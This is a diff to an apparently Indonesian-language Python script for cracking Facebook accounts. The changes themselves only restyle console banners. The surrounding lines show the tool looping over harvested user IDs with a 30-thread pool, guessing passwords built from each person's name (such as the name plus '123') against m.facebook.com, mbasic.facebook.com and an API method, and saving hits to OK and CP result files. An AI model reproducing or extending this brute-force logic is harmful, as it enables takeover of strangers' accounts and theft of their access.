@@ -594,7 +594,7 @@ def sandimanual():
 	elif ask=="1":
 		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
-		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
+		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
@@ -617,7 +617,7 @@ def sandimanual():
 			for user in id:
 				uid, name = user.split("<=>")
 				fall.submit(mfbasic, uid, pwek.split(","),"https://m.facebook.com")
-		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
+		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	
 def sandiotomatis():
 	print("\n \x1b[1;92m╠══[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
@@ -626,7 +626,7 @@ def sandiotomatis():
 	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
 	ask=raw_input("\n \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
 	if ask=="":
-		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
+		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
 	elif ask=="1":
 		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
@@ -640,7 +640,7 @@ def sandiotomatis():
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				fall.submit(api, uid, pwx)
-		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
+		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	elif ask=="2":
 		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
@@ -654,7 +654,7 @@ def sandiotomatis():
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
-		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
+		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	elif ask=="3":
 		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
@@ -674,7 +674,7 @@ def sandiotomatis():
 def api(uid, pwx):
 	global ok, cp, loop, token
 	sys.stdout.write(
-		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
+		"\r %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	for pw in pwx:
 		pw = pw.lower()
